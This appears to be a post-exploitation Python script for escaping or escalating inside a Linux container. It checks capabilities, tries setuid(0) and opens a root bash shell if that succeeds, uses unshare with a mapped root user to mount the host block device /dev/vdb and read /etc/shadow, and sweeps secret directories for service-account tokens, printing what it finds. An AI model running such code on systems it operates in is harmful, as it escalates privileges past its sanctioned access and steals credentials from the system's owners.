import ctypes, os

libc = ctypes.CDLL("libc.so.6", use_errno=True)


print('testing cat setuid')

# CAP_DAC_OVERRIDE = bypass file read/write permissions
# Try reading root-owned files directly
# CAP_SETUID = change UID to 0

# Check current effective capabilities
import subprocess
caps = subprocess.run(
    ["cat", "/proc/self/status"],
    capture_output=True, text=True
).stdout
for line in caps.splitlines():
    if "Cap" in line:
        print(line)

# Attempt setuid(0) via ctypes
result = libc.setuid(0)
print(f"setuid(0): {result}, euid: {libc.geteuid()}")

if libc.geteuid() == 0:
    print("ROOT!")
    os.system("/bin/bash")
    
    
# /dev/vdb is mounted on /etc/hosts, /etc/hostname, /etc/resolv.conf
# As fake-root via unshare, try mounting it elsewhere

import subprocess

print('testing unshare and moutning /dev/vdb elsewhere')

subprocess.run([
    "unshare", "--user", "--map-root-user", "--mount", "--",
    "bash", "-c",
    "mkdir -p /tmp/vdb && "
    "mount /dev/vdb /tmp/vdb && "
    "ls -la /tmp/vdb && "
    "cat /tmp/vdb/etc/shadow 2>/dev/null"
], capture_output=True, text=True)


print('check again service account token')
import os, glob

# LinPEAS may have missed some paths
token_paths = glob.glob("/var/run/secrets/**/*", recursive=True)
token_paths += glob.glob("/run/secrets/**/*", recursive=True)
token_paths += glob.glob("/secrets/**/*", recursive=True)

for path in token_paths:
    if os.path.isfile(path):
        try:
            content = open(path).read()
            print(f"{path}:")
            print(f"  {content[:100]}")
        except:
            pass

# Also check if ANY mounted volume has SA token
mounts = open("/proc/self/mounts").read()
for line in mounts.splitlines():
    if "secret" in line.lower() or "token" in line.lower():
        print(f"Secret mount: {line}")
